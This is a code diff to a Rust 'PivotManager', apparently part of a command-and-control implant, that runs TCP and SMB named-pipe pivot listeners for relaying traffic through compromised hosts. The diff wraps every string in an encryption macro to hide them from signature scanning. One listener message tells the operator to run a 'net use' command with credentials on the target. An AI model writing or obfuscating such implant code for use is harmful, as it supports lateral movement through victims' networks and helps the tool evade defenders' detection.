@@ -37,9 +37,9 @@ impl PivotManager {
     }
 
     pub async fn start_agent_listener(&self, port: u16) -> String {
-        let listener = match TcpListener::bind(format!("0.0.0.0:{}", port)).await {
+        let listener = match TcpListener::bind(format!("{}:{}", aes_str!("0.0.0.0"), port)).await {
             Ok(l) => l,
-            Err(e) => return format!("Bind Error: {}", e),
+            Err(e) => return format!("{}: {}", aes_str!("Bind Error"), e),
         };
 
         let downstream_links = self.downstream_links.clone();
@@ -105,12 +105,12 @@ impl PivotManager {
             }
         });
 
-        format!("TCP Pivot Listener started on port {}", port)
+        format!("{} {}", aes_str!("TCP Pivot Listener started on port"), port)
     }
 
     #[cfg(target_os = "windows")]
     pub async fn start_named_pipe_listener(&self, pipe_name: String) -> String {
-        let full_path = format!(r"\\.\pipe\{}", pipe_name);
+        let full_path = format!("{}{}", aes_str!(r"\\.\pipe\"), pipe_name);
         let downstream_links = self.downstream_links.clone();
         let upstream_tx = self.upstream_tx.clone();
 
@@ -124,7 +124,7 @@ impl PivotManager {
                 let server = match create_security_pipe(&path_clone) {
                     Ok(s) => s,
                     Err(e) => {
-                        eprintln!("[Pivot] Pipe Create Error: {}", e);
+                        eprintln!("{}: {}", aes_str!("[Pivot] Pipe Create Error"), e);
                         tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                         continue;
                     }
@@ -145,7 +145,7 @@ impl PivotManager {
                         destination: 0,
                         source: link_id,
                         data: vec![],
-                        metadata: format!("SMB:{}", pipe_name), 
+                        metadata: format!("{}{}", aes_str!("SMB:"), pipe_name), 
                     };
                     if let Ok(serialized) = serde_json::to_vec(&init_frame) {
                         let _ = upstream_inner.send(serialized).await;
@@ -187,8 +187,10 @@ impl PivotManager {
 
         // [MODIFIED] Added Hint to the return string
         format!(
-            "SMB Named Pipe Listener started at {} (Authenticated Users Only).\n\n[!] REQUIRED: Destination hosts must have an authenticated session to this machine.\n    Run on Target: net use \\\\<PIVOT_IP>\\IPC$ /user:<USERNAME> <PASSWORD>",
-            full_path
+            "{} {} {}",
+            aes_str!("SMB Named Pipe Listener started at"),
+            full_path,
+            aes_str!("(Authenticated Users Only).\n\n[!] REQUIRED: Destination hosts must have an authenticated session to this machine.\n    Run on Target: net use \\\\<PIVOT_IP>\\IPC$ /user:<USERNAME> <PASSWORD>")
         )
     }
 
